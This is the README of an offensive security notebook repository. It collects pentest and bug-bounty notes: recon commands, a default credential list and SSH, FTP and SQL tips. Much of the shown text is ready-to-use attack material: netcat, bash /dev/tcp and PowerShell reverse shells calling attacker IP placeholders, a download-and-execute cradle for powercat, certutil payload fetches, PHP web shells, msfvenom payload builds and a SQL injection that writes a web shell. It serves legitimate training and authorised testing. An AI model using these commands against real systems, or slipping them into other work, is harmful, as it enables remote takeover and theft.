```ruby
███████╗ █████╗ ███████╗██╗   ██╗ ██████╗
██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝██╔════╝
█████╗  ███████║███████╗ ╚████╔╝ ██║  ███╗
██╔══╝  ██╔══██║╚════██║  ╚██╔╝  ██║   ██║
███████╗██║  ██║███████║   ██║   ╚██████╔╝
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝
Made with <3 by Riccardo Malatesta (@seeu)
```
[![License](https://img.shields.io/github/license/seeu-inspace/easyg)](LICENSE)
[![Open Source Love](https://badges.frapsoft.com/os/v1/open-source.svg?v=103)](https://github.com/ellerbrock/open-source-badges/)

EasyG started out as a script that I use to automate some information gathering tasks for my hacking process, [you can find it here](scripts/easyg.rb). Now it's more than that. Here I gather all the resources about hacking that I find interesting: notes, payloads, tools and more.

I try as much as possible to link to the various sources or inspiration for these notes. A large part of these notes are from: [PTS v4](https://blog.elearnsecurity.com/introducing-the-ptsv4-training-course.html), [PortSwigger Web Security Academy](https://portswigger.net/web-security), [PEN-200](https://www.offsec.com/courses/pen-200/), [Proving Grounds](https://www.offsec.com/labs/individual/), [TryHackMe](https://tryhackme.com/), [Hack The Box](https://hackthebox.com/), [HackTricks](https://book.hacktricks.xyz/), [Jhaddix](https://twitter.com/Jhaddix), [The Cyber Mentor](https://www.thecybermentor.com/), [NahamSec](https://www.youtube.com/@NahamSec) (and [NahamCon](https://www.nahamcon.com/)), InfoSec Twitter and many other amazing people.

## Table of Contents

- [Resources](#resources)
- [Useful tips](#useful-tips)
  - [Glossary](#glossary)
  - [Client-specific key areas of concern](#client-specific-key-areas-of-concern)
  - [General notes](#general-notes)
    - [Default Credentials](#default-credentials)
    - [PT initial foothold](#pt-initial-foothold)
    - [SSH notes](#ssh-notes)
    - [FTP notes](#ftp-notes)
    - [Git commands / shell](#git-commands--shell)
    - [Remote Desktop](#remote-desktop)
    - [SQL connections](#sql-connections)
    - [Reverse engineering](#reverse-engineering)
    - [File upload](#file-upload)
    - [Shells](#shells)
- [Check-lists](#check-lists)
  - [Toolset](#toolset) 
  - [Testing layers](#testing-layers)
  - [Penetration Testing cycle](#penetration-testing-cycle)
  - [Penetration Testing process](#penetration-testing-process)
  - [Bug Bounty Hunting](#bug-bounty-hunting)
    - [Multiple targets](#multiple-targets)
    - [Single target](#single-target)
- [Linux](#linux)
- [Tools](#tools)
  - [EasyG](#easyg)
  - [Burp Suite](#burp-suite)
  - [Netcat](#netcat)
  - [Socat](#socat)
  - [PowerShell](#powershell)
  - [WireShark](#wireshark)
  - [Tcpdump](#tcpdump)
  - [Bash scripting](#bash-scripting)
  - [Metasploit Framework](#metasploit-framework)
    - [Starting Metasploit](#starting-metasploit)
    - [MSF Syntax](#msf-syntax)
    - [Exploit Modules](#exploit-modules)
    - [Post-Exploitation](#post-exploitation)
  - [Others](#others)
- [Passive Information Gathering (OSINT)](#passive-information-gathering-osint)
  - [Notes](#notes)
  - [Tools](#tools-1)
  - [Target validation](#target-validation)
  - [User Information Gathering](#user-information-gathering)
- [Active Information Gathering](#active-information-gathering)
  - [DNS Enumeration](#dns-enumeration)
  - [Port Scanning](#port-scanning)
    - [Netcat](#netcat-1)
    - [Nmap](#nmap)
    - [Masscan](#masscan)
    - [Other tools](#other-tools)
  - [SMB Enumeration](#smb-enumeration)
  - [NFS Enumeration](#nfs-enumeration)
  - [SNMP Enumeration](#snmp-enumeration)
  - [HTTP / HTTPS enumeration](#http--https-enumeration)
  - [SSH enumeration](#ssh-enumeration)
- [Content Discovery](#content-discovery)
  - [Google Dorking](#google-dorking)
  - [GitHub Dorking](#github-dorking)
  - [Shodan Dorking](#shodan-dorking)
- [Networking](#networking)
- [Source code review](#source-code-review)
- [Vulnerability Scanning](#vulnerability-scanning)
  - [Nessus](#nessus)
  - [Nmap](#nmap-1)
  - [Nikto](#nikto)
  - [Nuclei](#nuclei)
- [Web vulnerabilities](#web-vulnerabilities)
  - [SQL Injection](#sql-injection)
  - [Authentication vulnerabilities](#authentication-vulnerabilities)
  - [Directory Traversal](#directory-traversal)
  - [File inclusion](#file-inclusion)
  - [OS Command Injection](#os-command-injection)
  - [Business logic vulnerabilities](#business-logic-vulnerabilities)
  - [Information Disclosure](#information-disclosure)
  - [Access control vulnerabilities and privilege escalation](#access-control-vulnerabilities-and-privilege-escalation)
  - [File upload vulnerabilities](#file-upload-vulnerabilities)
    - [Web shells](#shells)
  - [Server-side request forgery (SSRF)](#server-side-request-forgery-ssrf)
  - [Open redirection](#open-redirection)
  - [XXE injection](#xxe-injection)
  - [Cross-site scripting (XSS)](#cross-site-scripting-xss)
  - [Cross-site request forgery (CSRF)](#cross-site-request-forgery-csrf)
  - [Cross-origin resource sharing (CORS)](#cross-origin-resource-sharing-cors)
  - [Clickjacking](#clickjacking)
  - [DOM-based vulnerabilities](#dom-based-vulnerabilities)
  - [WebSockets](#websockets)
  - [Insecure deserialization](#insecure-deserialization)
  - [Server-side template injection](#server-side-template-injection)
  - [Web cache poisoning](#web-cache-poisoning)
  - [HTTP Host header attacks](#http-host-header-attacks)
  - [HTTP request smuggling](#http-request-smuggling)
  - [OAuth authentication](#oauth-authentication)
  - [JWT Attacks](#jwt-attacks)
  - [GraphQL](#graphql)
  - [WordPress](#wordpress)
  - [IIS - Internet Information Services](#iis---internet-information-services)
  - [Microsoft SharePoint](#microsoft-sharepoint)
  - [Lotus Domino](#lotus-domino)
  - [phpLDAPadmin](#phpLDAPadmin)
  - [Git source code exposure](#git-source-code-exposure)
  - [Subdomain takeover](#subdomain-takeover)
  - [4** Bypass](#4-bypass)
  - [Application level Denial of Service](#application-level-denial-of-service)
  - [APIs attacks](#apis-attacks)
  - [Grafana attacks](#grafana-attacks)
  - [Confluence attacks](#confluence-attacks)
  - [Kibana](#kibana)
  - [Argus Surveillance DVR](#argus-surveillance-dvr)
  - [Shellshock](#shellshock)
  - [Cassandra web](#cassandra-web)
  - [RaspAP](#raspap)
  - [Drupal](#drupal)
  - [Tomcat](#tomcat)
  - [Booked Scheduler](#booked-scheduler)
  - [phpMyAdmin](#phpmyadmin)
  - [PHP](#php)
  - [Symphony](#symphony)
  - [Adobe ColdFusion](#adobe-coldfusion)
  - [Webmin](#webmin)
- [Client-Side Attacks](#client-side-attacks)
  - [Client Information Gathering](#client-information-gathering)
  - [HTML applications](#html-applications)
  - [Microsoft Office](#microsoft-office)
  - [Windows Library Files](#windows-library-files)
  - [McAfee](#mcafee)
- [Server-side Attacks](#server-side-attacks)
  - [NFS](#nfs)
  - [IKE - Internet Key Exchange](##ike---internet-key-exchange)
  - [SNMP](#snmp)
  - [NodeJS](#nodejs)
  - [Python](#python)
  - [Redis 6379](#redis-6379)
  - [Oracle TNS](#oracle-tns)
  - [Memcached](#memcached)
  - [SMTP / IMAP](#smtp--imap)
  - [113 ident](#113-ident)
  - [FreeSWITCH](#freeswitch)
  - [Umbraco](#umbraco)
  - [VoIP penetration test](#voip-penetration-test)
  - [DNS](#dns)
- [Thick client vulnerabilities](#thick-client-vulnerabilities)
  - [DLL Hijacking](#dll-hijacking)
  - [Insecure application design](#insecure-application-design)
  - [Weak Hashing Algorithms](#weak-hashing-algorithms)
  - [Cleartext secrets in memory](#cleartext-secrets-in-memory)
  - [Hardcoded secrets](#hardcoded-secrets)
  - [Unsigned binaries](#unsigned-binaries)
  - [Lack of verification of the server certificate](#lack-of-verification-of-the-server-certificate)
  - [Insecure SSL/TLS configuration](#insecure-ssltls-configuration)
  - [Remote Code Execution via Citrix Escape](#remote-code-execution-via-citrix-escape)
  - [Direct database access](#direct-database-access)
  - [Insecure Windows Service permissions](#insecure-windows-service-permissions)
  - [Code injection](#code-injection)
  - [Windows persistence](#windows-persistence)
- [System Attacks](#system-attacks)
  - [Information gathering](#information-gathering)
    - [Windows](#windows)
    - [Linux](#linux-1)
  - [Password Attacks](#password-attacks)
    - [Wordlists](#wordlists)
    - [Password Cracking](#password-cracking)
    - [Network Service Attack](#network-service-attack)
    - [Leveraging Password Hashes](#leveraging-password-hashes)
  - [Port Redirection and Tunneling](#port-redirection-and-tunneling)
    - [Port Forwarding](#port-forwarding)
    - [SSH Tunneling](#ssh-tunneling)
    - [ssh.exe](#sshexe)
    - [Plink.exe](#plinkexe)
    - [Netsh](#netsh)
    - [Chisel](#chisel)
    - [DNS Tunneling](#dns-tunneling)
    - [Metasploit Portfwd](#metasploit-portfwd)
  - [Linux Privilege Escalation](#linux-privilege-escalation)
    - [Resources](#resources-2)
    - [Strategy](#strategy)
    - [Reverse Shell](#reverse-shell)
    - [Service Exploits](#service-exploits)
    - [Weak File Permissions](#weak-file-permissions)
    - [Exposed Confidential Information](#exposed-confidential-information)
    - [SSH](#ssh)
    - [Sudo](#sudo)
    - [Cron Jobs](#cron-jobs)
    - [SUID / SGID Executables](#suid--sgid-executables)
    - [Passwords & Keys](#passwords--keys)
    - [Kernel Exploits](#kernel-exploits)
    - [find with exec](#find-with-exec)
    - [find PE](#find-pe)
    - [Abusing capabilities](#abusing-capabilities)
    - [Escape shell](#escape-shell)
    - [Docker](#docker)
    - [User groups](#user-groups)
    - [fail2ban](#fail2ban)
    - [Postfix](#postfix)
  - [Windows Privilege Escalation](#windows-privilege-escalation)
    - [Resources](#resources-3)
    - [Strategy](#strategy-1)
    - [Privileges](#privileges)
    - [Privileged Groups](#privileged-groups)
    - [Add new admin user](#add-new-admin-user)
    - [Log in with another user from the same machine](#log-in-with-another-user-from-the-same-machine)
    - [Generate a reverse shell](#generate-a-reverse-shell)
    - [Kernel Exploits](#kernel-exploits-1)
    - [Driver Exploits](#driver-exploits)
    - [Service Exploits](#service-exploits-1)
    - [CVEs](#cves)
    - [User Account Control (UAC)](#user-account-control-uac)
    - [Insecure File Permissions](#insecure-file-permissions)
    - [Registry](#registry)
    - [Passwords](#passwords)
    - [Scheduled Tasks](#scheduled-tasks)
    - [Installed Applications](#installed-applications)
    - [Startup Apps](#startup-apps)
    - [Hot Potato](#hot-potato)
    - [Token Impersonation](#token-impersonation)
    - [getsystem](#getsystem)
    - [Pass The Hash](#pass-the-hash-1)
    - [Pass The Password](#pass-the-password)
    - [Apache lateral movement](#apache-lateral-movement)
    - [Read data stream](#read-data-stream)
    - [PrintNightmare](#printnightmare)
    - [Bypass CLM / CLM breakout | CLM / AppLocker Break Out](#bypass-clm--clm-breakout--clm--applocker-break-out)
    - [From Local Admin to System](#from-local-admin-to-system)
    - [TeamViewer](#teamviewer)
    - [Exploiting service through Symbolic Links](#exploiting-service-through-symbolic-links)
    - [Write privileges](#write-privileges)
    - [Services running - Autorun](#services-running---autorun)
    - [CEF Debugging Background](#cef-debugging-background)
  - [Buffer Overflow](#buffer-overflow)
  - [Antivirus Evasion](#antivirus-evasion)
    - [ToDo](#todo)
    - [With Evil-WinRM](#with-evil-winrm)
    - [Thread Injection](#thread-injection)
    - [Shellter](#shellter)
  - [Active Directory](#active-directory)
    - [Notes](#notes-2)
    - [Manual Enumeration](#manual-enumeration)
    - [Initial foothold](#initial-foothold)
    - [SMB](#smb)
    - [RPC](#rpc)
    - [Azure](#azure)
    - [LDAP](#ldap)
    - [PowerView](#powerview)
    - [PsLoggedOn](#psloggedon)
    - [Service Principal Names Enumeration](#service-principal-names-enumeration)
    - [Object Permissions Enumeration](#object-permissions-enumeration)
    - [Domain Shares Enumeration](#domain-shares-enumeration)
    - [SharpHound](#sharphound)
    - [BloodHound](#bloodhound)
    - [Mimikatz](#mimikatz-1)
    - [Active Directory Authentication Attacks](#active-directory-authentication-attacks)
    - [Lateral Movement Techniques and Pivoting](#lateral-movement-techniques-and-pivoting)
    - [Credentials Harvesting](#credentials-harvesting)
    - [Active Directory Persistence](#active-directory-persistence)
    - [Remote Desktop](#remote-desktop)
- [Mobile](#mobile)
  - [Missing Certificate and Public Key Pinning](#missing-certificate-and-public-key-pinning)
  - [Cordova attacks](#cordova-attacks)
- [Cloud hacking](#cloud-hacking)
  - [Abusing S3 Bucket Permissions](#abusing-s3-bucket-permissions)
  - [AWS Cognito](#aws-cognito)
  - [Google Cloud Storage bucket](#google-cloud-storage-bucket)
- [Artificial intelligence vulnerabilities](#artificial-intelligence-vulnerabilities)
  - [Prompt Injection](#prompt-injection)



## Resources

**Blogs**
- [Skeleton Scribe (albinowax)](https://www.skeletonscribe.net)
- [PortSwigger Research](https://portswigger.net/research)

**Reports**
- [Pentest reports](https://pentestreports.com/)
- [Public pentesting reports](https://github.com/juliocesarfort/public-pentesting-reports)
- [Facebook-BugBounty-Writeups](https://github.com/jaiswalakshansh/Facebook-BugBounty-Writeups)
- [List of bug-bounty writeups](https://pentester.land/list-of-bug-bounty-writeups.html)

**News**
- [CVE trends](https://cvetrends.com/)
- [Packet Storm](https://packetstormsecurity.com/)
- [PortSwigger/research](https://portswigger.net/research)
- [all InfoSec news](https://allinfosecnews.com/)

**Newsletters**
- [Bug Bytes](https://blog.intigriti.com/category/bugbytes/)
- [Executive Offense](https://executiveoffense.beehiiv.com/subscribe)
- [The Unsupervised Learning Newsletter](https://danielmiessler.com/newsletter/)
- [Executive Offense](https://executiveoffense.beehiiv.com/subscribe)
- [TLDR Newsletter](https://tldr.tech/)
- [Hive Five - securibee](https://securib.ee/newsletter/)
- [Vulnerable U](https://vulnu.beehiiv.com/)
- [The Security, Funded Newsletter](https://securityfunded.com/)

**Podcasts**
- [Critical Thinking - Bug Bounty Podcast](https://www.criticalthinkingpodcast.io/)
- [Darknet Diaries](https://darknetdiaries.com/)

**YouTube channels**
- [Bug Bounty Reports Explained](https://www.youtube.com/@BugBountyReportsExplained)
- [jhaddix](https://www.youtube.com/@jhaddix)
- [John Hammond](https://www.youtube.com/@_JohnHammond)
- [The Cyber Mentor](https://www.youtube.com/@TCMSecurityAcademy)
- [STÖK](https://www.youtube.com/@STOKfredrik)
- [NahamSec](https://www.youtube.com/@NahamSec)
- [IppSec](https://www.youtube.com/@ippsec)

## Useful tips

- For RCE 
  - Never upload a shell at first, you can be banned from a program. Just execute a `whoami` as a PoC, proceed with a shell if required/allowed.
- For stored XSS
  - `console.log()` is better than `alert()`, it makes less noise especially for stored XSS.
- For SQLi
  - Don't dump the entire db, you can be banned from a program. Just retrieve the db's name, version and/or other minor infos. Proceed with db dump only if required/allowed;
  - Don't use tautologies like `OR 1=1`, it can end up in a delete query or something dangerous. It's better to use `AND SLEEP(5)` or `te'+'st`.
- For subdomain takeovers
  - use as a PoC an html page like:<br/>
    9a69e2677c39cdae365b49beeac8e059.html
    ```HTML
    <!-- PoC by seeu -->
    ```
- For Metasploit: the port `4444` is very common with Metasploit, so this can trigger some warnings. Consider using another port if the exploit doesn't work.

### <ins>Glossary</ins>

- [Session hijacking](https://owasp.org/www-community/attacks/Session_hijacking_attack)
- [Session fixation](https://owasp.org/www-community/attacks/Session_fixation)

**Shells**
- Shell: we open a shell on the client
- Reverse shell: we make the victim connect to us with a shell
  - Attacker: `nc -lvp 4444`
  - Victim: `nc <ip_attacker> 4444 -e /bin/sh`
- Bind shell: the victim has a listener running and the attacker connects to it in order to get a shell
  - Attacker: `nc <ip_victim> 4444`
  - Victim: `nc -lvp 4444 -e /bin/sh`

**Payloads**
- Staged: Sends payload in stages, can be less stable
  - example: `windows/meterpreter/reverse_tcp`
- Non-staged: Sends exploit all at once, larger in size and won't always work
  - example: `windows/meterpreter_reverse_tcp`

**Active directory**
There can be multiple domains. This is called a tree, a parent domain and other child domains. With many trees you start to have a forest. Inside are the Organization Unites, objects.

Trust:
- Directional: one domain trust one domain
- Transactional: one domain trusts one domain and everything that it trusts

SYSVOL is a folder that exists on all domain controllers. It is a shared folder storing the Group Policy Objects (GPOs) and information along with any other domain related scripts. It is an essential component for Active Directory since it delivers these GPOs to all computers on the domain. Domain-joined computers can then read these GPOs and apply the applicable ones, making domain-wide configuration changes from a central location.

### <ins>Client-specific key areas of concern</ins>
- [HIPAA](https://www.hhs.gov/hipaa/for-professionals/security/laws-regulations/index.html), a framework that governs medical data in the US
- [PCI](https://www.pcisecuritystandards.org/), a framework that governs credit card and payment processing
- [GDPR](https://gdpr-info.eu/), a Regulation in EU law on data protection and privacy in the EU and the European Economic Area
  - Examples
    - ["Twitter fined ~$550K over a data breach in Ireland’s first major GDPR decision"](https://techcrunch.com/2020/12/15/twitter-fined-550k-over-a-data-breach-in-irelands-first-major-gdpr-decision/), [Tweet from Whitney Merrill](https://twitter.com/wbm312/status/1645497243708067841)
    - See also: [Increasing your bugs with the impact of the GDPR](https://www.youtube.com/watch?v=7JiOqXIZHy0)

### <ins>General notes</ins>

#### <ins>Default Credentials</ins>
- admin:admin
- administrator:administrator
- admin:password
- admin:secret
- root:root
- root:password
- ftp:ftp
- Anonymous:_blank
- username:username
- guest:_blank
- guest:guest
- admin:servicename
- tomcat:s3cret
- firstname:surname


#### <ins>PT initial foothold</ins>

**Light way scan**
1. `ports=$(nmap -p- --min-rate=1000 -T4 192.168.134.126 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`
2. `echo $ports`
3. `nmap -p$ports -sC -sV 192.168.134.126 -oN nmap_results`
   - `sU` for UDP, `sT` for TCP

**More scans**
- `nmap -T4 -p- --min-rate=1000 -sV -sC -vvv -oN nmap_results 192.168.134.114 -Pn`
- `for i in {1..65535}; do (echo > /dev/tcp/172.17.0.1/$i) >/dev/null 2>&1 && echo $i is open; done`
- `dig @192.168.212.165 AXFR heist.offsec`
- `dnsenum 192.168.212.165`
- `autorecon 192.168.228.109`
- `rustscan --ulimit 5000 192.168.220.131`
- `nikto -host=http://www.targetcorp.com -maxtime=30s`

**Fast way**
1. `masscan -p1-65535 10.10.10.93 --rate=1000 -e tun0 > ports`
2. `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
3. `nmap -Pn -sV -sC -p$ports 10.10.10.93`

**Checklist**
- Top 100 ports: `TCP(100;7,9,13,21-23,25-26,37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000-6001,6646,7070,8000,8008-8009,8080-8081,8443,8888,9100,9999-10000,32768,49152-49157)`
- Check always the source code for comments and secrets
  - maybe a functionality has been disabled and can be renabled
  - maybe you can find secrets

**If you find an unkwon service, try again this command**
- `sudo nmap -sC -sV -p PORTNUMBER -sU 10.10.10.116`

**Other ways**
- `for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done`
- `for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done`

#### <ins>SSH notes</ins>

- `scp username@remoteHost:/remote/dir/file.txt /local/dir/`
  - `scp Administrator@10.10.210.84:"/C:/Users/Administrator/Downloads/20230824142942_loot.zip" "/home/kali/Documents/engagements/TryHackMe/Post-Exploitation Basics/loot.zip"`
- `pscp.exe username@remoteHost:/remote/dir/file.txt d:\`

**ssh exploitation**
- `scp -O /home/kali/Documents/engagements/proving-grounds/Sorcerer/max/authorized_keys max@192.168.240.100:/home/max/.ssh/authorized_keys`
  - `mv /home/kali/Documents/engagements/proving-grounds/Sorcerer/max/ /home/kali/.ssh/id_rsa`
  - https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/sorcerer

**Create ssh keys**
- `sudo ssh-keygen`
- `sudo cp /root/.ssh/id_rsa.pub authorized_keys`
- `cd /home/benoit/.ssh`
- `put authorized_keys`
- `sudo ssh benoit@192.168.218.233 -i /root/.ssh/id_rsa`

#### <ins>FTP notes</ins>

- `ftp -p IP 1221`
  - `force passive mode`
- `put FILE`
- `get FILE`
- try default creds (`ftp:ftp`, `anonymous:`, etc.)
- Consider that your uploads might end up in the directory `/var/ftp`
- Try `binary` for binary mode if the ftp is not working well


#### <ins>Git commands / shell</ins>

- Basic git process
  - `git clone <source>`
  - `git add -A`
  - `git commit -m "comment"`
  - `git push origin master`
- When access to git shell
  - `GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@IP:/git-server`
  - `GIT_SSH_COMMAND='ssh -i /home/kali/Documents/engagements/proving-grounds/Hunit/id_rsa -p 43022' git push origin master`
- GitTools
  1. `./gitdumper.sh http://IP/.git/ git-repo-dir`
  2. `git checkout -- .`


#### <ins>Remote Desktop</ins>

- `xfreerdp /u:username /p:password /cert:ignore /v:IP`
- `xfreerdp /u:username /p:password /d:domain.com /v:IP`
- `rdesktop -u username -p password IP`
- `remmina`

#### <ins>SQL connections</ins>

- `mysql --host=localhost --user=proftpd --password=protfpd_with_MYSQL_password`
- `psql -h IP -p 5432 -U root -W`
- `mssqlclient.py -p 1435 username:password@IP`
  - `xp_cmdshell whoami /all`
  - `xp_cmdshell copy \\ATTACKERIP\nc\nc.exe c:\Users\Public\nc.exe`
- `impacket-mssqlclient username:'password'@127.0.0.1 -windows-auth`

**SQLite3**
- If you have found a db, you can open it manually or with `sqlite3 Audit.db`
- Second option, commands: `.tables`, `selecet * fom tableOfUsers;`

**MongoDB**
- `mongo --host IP:PORT`
- `mongo <database> -u <username> -p '<password>'`
- `nmap -n -sV --script mongodb-brute -p 27017 IP`
- `show dbs`
- `use dbname`
- `db.users.find()`
- https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb


#### <ins>Reverse engineering</ins>

- [DNSpy](https://github.com/dnSpy/dnSpy), .NET debugger
- https://github.com/seeu-inspace/easyg#hardcoded-secrets
- See hardcoded secrets
- `wine /home/kali/Documents/dnSpy/dnSpy.exe`
- Remove '\r' carriage return:
  `tr -d '\r' < inputfile.txt > outputfile.txt && mv outputfile.txt inputfile.txt`
  - The major minor symbols must be kept
  - alternative: `dos2unix 46527.sh`


**Brainfuck**
- Brainfuck example: `++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.`
- Deobfuscator: https://www.splitbrain.org/_static/ook/


#### <ins>File upload</ins>

- for gifs: `GIF87a;` or `GIF89a;`
- remember that if you can do an arbitrary upload, then try to view the files with an LFI with `zip://`, `php://` or other wrappers

**cURL**
- `curl -X POST -F "file=@/path/to/your/file" http://example.com/postinfo.html`
- `curl -X PUT --upload-file exploit.html http://example.com/exploit.html`
- `curl -X MOVE --header 'Destination:http://example.com/exploit.asp' 'http://exploit.com/exploit.html`

#### <ins>Shells</ins>

**Web shells**
- In kali, `cd /usr/share/webshells/`
  - `asp`, `aspx`, `cfm`, `jsp`, `laudanum`, `perl`, `php`, `phtml`
- `cp /usr/share/webshells/php/php-reverse-shell.php .`
- `cp /home/kali/Documents/windows-attack/Scripts/windows-php-reverse-shell.php .`
- for gifs: `GIF87a;` or `GIF89a;`
- https://github.com/Dhayalanb/windows-php-reverse-shell/tree/master
- `.htaccess`: https://github.com/wireghoul/htshells
  - Another trick from OSCP Walkthroughs
    - ```
      .htaccess
      AddType application/x-httpd-php .evil
      (+)
      siren.evil
      <pre><?php echo system($_GET['cmd']); ?></pre>
      ```
- for asp applications
  - `cp /usr/share/webshells/aspx/cmdasp.aspx .`
  - `cp /usr/share/laudanum/aspx/shell.aspx .`
  - `wget https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp -O cmd.asp`
  - try `.aspx` or `.mspx` to upload a cmd shell
  - another try:
    1. https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc   (+)
    2. https://github.com/autofac/Examples/blob/master/src/WebFormsExample/Site.Master.cs
    - See "Proving Grounds: Butch" https://auspisec.com/blog/20220118/proving_grounds_butch_walkthrough.html
  - `web.config` to run as an ASP: https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/
  - `cp /usr/share/webshells/config/web.config .`


**Reverse shells**
- `mknod a p && telnet IP 443 0<a | /bin/sh 1>a`
- `certutil.exe -urlcache -split -f http://IP/nc.exe nc.exe`
  - `.\\\\nc.exe IP 443 -e cmd.exe`
- `\\IP\Share\nc.exe IP 443 -e cmd.exe`
- `bash -i >& /dev/tcp/IP/80 0>&1`
- `nc -nv IP 80 -e /bin/bash`
- Notes
  - https://www.revshells.com/
  - https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/
  - Windows Reverse Shell Generator — https://github.com/thosearetheguise/rev
  - For the listener, use `rlwrap`


**Windows Reverse Shell**
1. `sudo impacket-smbserver -smb2support share /home/kali/Documents/windows-attack/nc/`
2. `cmd.exe /c //IP/Share/nc.exe -e cmd.exe IP 7680`
- Fix PATH: `set PATH=%SystemRoot%\system32;%SystemRoot%;`


**Powershell Reverse Shell**
- `powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://IP/powercat.ps1');powercat -c IP -p 5040 -e powershell"`
- `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('IP',21);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
- `powershell -e <BASE64>`
  - `python ps_encoder.py -s powershell_reverse_shell.ps1`
  - `python ps_encoder.py -s powershell_reverse_shell_2.ps1`


**Upgrade shell**
1. `python -c 'import pty;pty.spawn("/bin/bash")'`
   - `python3 -c 'import pty;pty.spawn("/bin/bash")'`
   - `perl -e 'exec "/bin/bash";'`
   - `/usr/bin/script -qc /bin/bash /dev/null`
2. `CTRL^Z`
3. `stty raw -echo;fg`
4. `reset`
5. `xterm-256color`
If something goes wrong
- `export TERM=xterm-256color`
- `stty rows 56 columns 213`
- `export PATH="/bin:/sbin:/usr/bin:/usr/sbin:$PATH"`
- `export SHELL=/bin/bash`


**msfvenom shells**
- `msfvenom -p linux/x64/exec -f elf-so PrependSetuid=true | base64`
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8444 EXITFUNC=thread -f exe -o shell.exe`
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=445 -f exe -e 64/xor -o shell.exe`
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.163 LPORT=445 -f exe -o shell.exe`
- `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.163 LPORT=445 -f exe -o shell.exe`
- `msfvenom -f psh-cmd -p windows/shell_reverse_tc LHOST=tun0 LPORT=8443 -o rev.ps1`
- `msfvenom -f ps1 -p windows/shell_reverse_tcp LHOST=tun0 LPORT=8443 -o rev.ps1`
- `msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f msi > shell.msi`
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8444 -f aspx > devel.aspx`
  - run with: `msiexec /quiet /qn /i shell.msi`
- `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.231 LPORT=4242 -f elf > reverse.elf`
- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.30 LPORT=4445 -f war > shell.war`
  - for file uploads in tomcat/manager
  - `setoolkit > 1 > 9 > 1`
- Resources
  - https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
  - https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/

**Access shell**
- `impacket-wmiexec domain.local/username@IP`
- `impacket-wmiexec domain.local/username@IP -hashes :HASH`
- `evil-winrm -u 'username' -p '*******' -i IP -N`
- `evil-winrm -i IP -u username -p password`
- `evil-winrm -u username -H ':HASH' -i IP -N`
- `crackmapexec smb IP -u username -p "password"`
- `impacket-psexec username:password@IP`
  - `msf> use exploit/windows/smb/psexec`
  - https://0xdf.gitlab.io/2020/01/26/digging-into-psexec-with-htb-nest.html

**Save files**
- `echo "<?php system('chmod +x /usr/bin/find; chmod +s /usr/bin/find');?>" >index.php`
- `' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -'`
- `curl -T my-shell.php -u 'administrant:sleepless' http://muddy.ugc/webdav/`

## Check-lists

- [SMB-Checklist](https://github.com/pentesterzone/pentest-checklists/blob/master/Services/SMB-Checklist.md)
- [Win32 Offensive Cheatsheet](https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet)
- [Regexp Security Cheatsheet](https://github.com/attackercan/regexp-security-cheatsheet)
- [Cheat-Sheet - Active-Directory](https://github.com/drak3hft7/Cheat-Sheet---Active-Directory)
- [Security Testing of Thick Client Application](https://medium.com/@david.valles/security-testing-of-thick-client-application-15612f326cac)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [OSSTMM](https://isecom.org/research.html)
- [MindMaps](https://github.com/imran-parray/Mind-Maps)

### <ins>Toolset</ins>
- [ ] [EasyG](#easyg) and all the connected tools
- [ ] [Burp Suite](#burp-suite) and all the extensions
- [ ] [Kali Linux](https://www.kali.org/) since it has everything you need

### <ins>Testing layers</ins>

See [The Bug Hunter's Methodology v4.0 - Recon Edition by @jhaddix #NahamCon2020!](https://www.youtube.com/watch?v=p4JgIu1mceI)
- [ ] Integrations
- [ ] Application Libraries (usually JavaScript)
- [ ] Application: Custom Code or COTS
- [ ] Application Framework
- [ ] Web Hosting Software (Default creds, Web server misconfigurations, web exploits)
- [ ] Open Ports and Services (Default creds on services, service level exploits)

